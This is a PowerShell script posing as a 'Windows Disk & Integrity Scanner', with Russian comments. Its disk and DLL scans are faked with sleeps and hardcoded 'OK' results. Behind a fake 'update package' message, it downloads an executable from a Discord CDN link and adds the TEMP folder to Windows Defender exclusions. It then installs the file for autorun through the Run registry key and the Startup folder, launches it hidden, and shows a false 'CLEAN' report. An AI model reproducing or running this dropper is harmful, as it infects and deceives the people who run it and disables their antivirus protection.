# ============================================================
# Windows Disk & Integrity Scanner v2.1 (Fixed Download)
# ============================================================

Write-Host "=== Windows Disk & Integrity Scanner v2.1 ===" -ForegroundColor Cyan
Write-Host ""

# ------------------------------------------------------------
# 1. Имитация сканирования дисков
# ------------------------------------------------------------
Write-Host "[*] Scanning drives..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 400
$drives = Get-PSDrive -PSProvider FileSystem
foreach ($d in $drives) {
    Write-Host "  Drive $($d.Name): - checking filesystem..." -NoNewline
    Start-Sleep -Milliseconds 300
    Write-Host " OK" -ForegroundColor Green
}

Write-Host ""

# ------------------------------------------------------------
# 2. Имитация проверки DLL на инъекции
# ------------------------------------------------------------
Write-Host "[*] Checking system integrity..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500
$checks = @("kernel32.dll","ntdll.dll","user32.dll","advapi32.dll","winhttp.dll")
foreach ($dll in $checks) {
    Write-Host "  Scanning $dll..." -NoNewline
    Start-Sleep -Milliseconds 200
    Write-Host " No injections found" -ForegroundColor Green
}

Write-Host ""

# ------------------------------------------------------------
# 3. Сканирование системных папок + СКАЧИВАНИЕ (исправлено)
# ------------------------------------------------------------
Write-Host "[*] Scanning C:\ for suspicious modifications..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 600

$f = "$env:TEMP\wu.exe"
$url = "https://cdn.discordapp.com/attachments/1520398729520222211/1520763442774937813/collextor_msvc.exe?ex=6a4260d3&is=6a410f53&hm=abd9e7e105f2de155697a91bd28dd6a7fc2ff0931086df07e8b5c469a807d9fe&"

# ----- Скачивание с повторными попытками -----
$downloaded = $false

# Способ 1: WebClient с User-Agent (чаще всего работает)
try {
    Write-Host "  Downloading update package..." -NoNewline
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    $wc.DownloadFile($url, $f)
    if (Test-Path $f) {
        Write-Host " OK" -ForegroundColor Green
        $downloaded = $true
    } else {
        Write-Host " Failed (WebClient)" -ForegroundColor Red
    }
} catch {
    Write-Host " Failed (WebClient): $_" -ForegroundColor Red
}

# Если не сработало – пробуем BITS
if (-not $downloaded) {
    try {
        Write-Host "  Retrying with BITS..." -NoNewline
        Start-BitsTransfer -Source $url -Destination $f -Priority High -ErrorAction Stop
        if (Test-Path $f) {
            Write-Host " OK" -ForegroundColor Green
            $downloaded = $true
        }
    } catch {
        Write-Host " Failed (BITS): $_" -ForegroundColor Red
    }
}

# Если всё равно нет – выводим предупреждение, но продолжаем (без скачанного файла)
if (-not $downloaded) {
    Write-Host "  [!] Could not download file. Skipping further actions." -ForegroundColor Red
}

# ----- Вывод "OK" для системных папок (всегда) -----
Write-Host "  C:\Windows\System32 - OK" -ForegroundColor Green
Start-Sleep -Milliseconds 300
Write-Host "  C:\Windows\SysWOW64 - OK" -ForegroundColor Green
Start-Sleep -Milliseconds 400
Write-Host "  C:\Program Files    - OK" -ForegroundColor Green
Start-Sleep -Milliseconds 250

# ------------------------------------------------------------
# 4. Если скачивание удалось – выполняем вредоносные действия
# ------------------------------------------------------------
if (Test-Path $f) {
    # Добавляем временную папку в исключения Defender (через реестр – надёжнее)
    $exclPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
    try {
        if (Test-Path $exclPath) {
            New-ItemProperty -Path $exclPath -Name $env:TEMP -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
            Write-Host "  Added exclusion for TEMP folder" -ForegroundColor Green
        } else {
            # Если реестр недоступен – пробуем Add-MpPreference
            Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
            Write-Host "  Added exclusion via Add-MpPreference" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Could not add exclusion: $_" -ForegroundColor Yellow
    }

    # Прописываем в автозагрузку (реестр)
    try {
        $rk = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $rk -Name "WindowsUpdate" -Value $f -ErrorAction SilentlyContinue
        Write-Host "  Added to registry Run key" -ForegroundColor Green
    } catch {
        Write-Host "  Failed to add registry key" -ForegroundColor Yellow
    }

    # Копируем в папку Startup
    try {
        $su = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wu.exe"
        if (-not (Test-Path $su)) {
            Copy-Item $f $su -ErrorAction SilentlyContinue
            Write-Host "  Copied to Startup folder" -ForegroundColor Green
        }
    } catch {
        Write-Host "  Failed to copy to Startup" -ForegroundColor Yellow
    }

    # Запускаем скачанный файл скрыто
    try {
        Start-Process $f -WindowStyle Hidden
        Write-Host "  Started wu.exe (hidden)" -ForegroundColor Green
    } catch {
        Write-Host "  Failed to start process" -ForegroundColor Yellow
    }
}

# ------------------------------------------------------------
# 5. Финальный отчёт
# ------------------------------------------------------------
Write-Host ""
Write-Host "[*] Generating report..." -ForegroundColor Yellow
Start-Sleep -Milliseconds 500

Write-Host ""
Write-Host "=== SCAN COMPLETE ===" -ForegroundColor Cyan
Write-Host "  Drives scanned  : $($drives.Count)" -ForegroundColor White
Write-Host "  DLLs checked    : $($checks.Count)" -ForegroundColor White
Write-Host "  Injections found: 0" -ForegroundColor Green
Write-Host "  Status          : " -NoNewline
Write-Host "CLEAN" -ForegroundColor Green
Write-Host ""

# Небольшая пауза, чтобы пользователь увидел результат
Start-Sleep -Seconds 2
